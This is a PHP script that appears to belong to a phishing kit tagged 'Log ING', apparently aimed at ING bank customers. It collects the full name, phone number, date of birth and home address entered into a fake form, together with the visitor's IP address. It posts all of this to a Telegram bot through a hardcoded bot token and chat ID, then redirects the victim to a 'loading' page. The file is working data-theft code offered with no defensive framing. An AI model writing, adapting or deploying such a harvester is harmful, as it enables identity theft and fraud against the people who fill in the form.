<?php

$Xzour = getenv("REMOTE_ADDR");

$message .= "--++-----[ INFORMAION ]-----++--\n";

$message .= "Full name: ".$_POST['fname']."\n";
$message .= "phonee numbr: ".$_POST['phone']."\n";
$message .= "DDOOBB: ".$_POST['dob']."\n";
$message .= "addres: ".$_POST['address']."\n";

$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $Xzour\n";
$subject = "Log ING By xzour [ " . $Xzour . " ] ";
$website="https://api.telegram.org/bot1699033034:AAGX5AmUb8m4fYNrjM72HcqThndO_ffsvv0";
$chatId=1264515066;  //Receiver Chat Id 
$params=[
    'chat_id'=>'1264515066',
   'text'=>$message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);


 header("Location: ../C.php?channel=true&form=loading&sdjsdhsdghyuhgsdyusdhqsjsdghsgh=");

?>

